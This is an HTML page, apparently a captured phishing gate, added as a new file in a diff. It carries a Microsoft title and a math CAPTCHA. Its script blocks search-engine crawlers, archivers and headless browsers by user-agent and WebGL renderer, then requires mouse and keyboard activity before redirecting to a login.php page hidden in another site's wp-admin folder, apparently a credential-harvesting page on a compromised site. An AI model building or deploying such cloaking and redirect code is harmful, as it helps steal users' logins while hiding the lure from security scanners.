@@ -1,0 +1,161 @@
+<!-- url: https://www.castelar-digital.com.ar/track?id=f0935e4cd5920aa6c7c996a5ee53a70f&url=http://barchanews.com/1/index.html
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Microsoft</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f0f0f0;
+    }
+    .container {
+      text-align: center;
+      padding: 20px;
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    #captchaQuestion {
+      margin-bottom: 20px;
+      font-size: 18px;
+    }
+    #captchaInput {
+      padding: 10px;
+      font-size: 16px;
+      margin-bottom: 10px;
+    }
+    #verifyButton {
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    #verifyButton:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
+    }
+    #error {
+      color: red;
+      display: none;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Please Verify</h2>
+    <div id="captchaQuestion"></div>
+    <input type="text" id="captchaInput" placeholder="Enter answer">
+    <button id="verifyButton" disabled>Verify</button>
+    <div id="error">Verification failed. Please try again.</div>
+  </div>
+
+  <script>
+    // Bot detection variables
+    let mouseMoved = false;
+    let keyPressed = false;
+    let startTime = Date.now();
+
+    // Common bot user-agents (partial list)
+    const botUserAgents = [
+      'bot', 'crawler', 'spider', 'googlebot', 'bingbot', 'yandexbot',
+      'baiduspider', 'slurp', 'duckduckbot', 'facebot', 'ia_archiver'
+    ];
+
+    // Check user-agent for bot signatures
+    function isBotUserAgent() {
+      const ua = navigator.userAgent.toLowerCase();
+      return botUserAgents.some(bot => ua.includes(bot));
+    }
+
+    // Generate simple math CAPTCHA
+    function generateCaptcha() {
+      const num1 = Math.floor(Math.random() * 10) + 1;
+      const num2 = Math.floor(Math.random() * 10) + 1;
+      const answer = num1 + num2;
+      document.getElementById('captchaQuestion').textContent = `What is ${num1} + ${num2}?`;
+      return answer;
+    }
+
+    // Initialize CAPTCHA
+    const correctAnswer = generateCaptcha();
+
+    // Behavioral checks
+    document.addEventListener('mousemove', () => {
+      mouseMoved = true;
+      checkVerificationReadiness();
+    });
+
+    document.addEventListener('keydown', () => {
+      keyPressed = true;
+      checkVerificationReadiness();
+    });
+
+    // Enable verify button only after behavioral checks pass
+    function checkVerificationReadiness() {
+      const timeElapsed = Date.now() - startTime > 2000; // At least 2 seconds
+      if (mouseMoved && keyPressed && timeElapsed) {
+        document.getElementById('verifyButton').disabled = false;
+      }
+    }
+
+    // Verification logic
+    document.getElementById('verifyButton').addEventListener('click', () => {
+      const userAnswer = document.getElementById('captchaInput').value.trim();
+      const errorDiv = document.getElementById('error');
+
+      // Block if user-agent is a bot
+      if (isBotUserAgent()) {
+        errorDiv.style.display = 'block';
+        errorDiv.textContent = 'Access denied.';
+        return;
+      }
+
+      // Check CAPTCHA answer
+      if (parseInt(userAnswer) === correctAnswer) {
+        // Replace with your redirect logic (e.g., actual URL or server-side redirect)
+        window.location.href = 'https://vanhoadoanhnghiep.vn/wp-admin/1/IdVerm/auth/login.php';
+      } else {
+        errorDiv.style.display = 'block';
+        document.getElementById('captchaInput').value = '';
+        // Generate new CAPTCHA
+        const newAnswer = generateCaptcha();
+        correctAnswer = newAnswer;
+      }
+    });
+
+    // Prevent automated form submission
+    document.addEventListener('submit', (e) => {
+      e.preventDefault(); // Disable any form submissions
+    });
+
+    // Optional: Block headless browsers by checking WebGL
+    function isHeadless() {
+      const gl = document.createElement('canvas').getContext('webgl');
+      if (!gl) return true;
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      if (!debugInfo) return true;
+      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      return renderer.includes('SwiftShader') || renderer.includes('llvmpipe');
+    }
+
+    if (isHeadless()) {
+      document.getElementById('error').style.display = 'block';
+      document.getElementById('error').textContent = 'Access denied.';
+      document.getElementById('verifyButton').disabled = true;
+    }
+  </script>
+</body>
+</html>
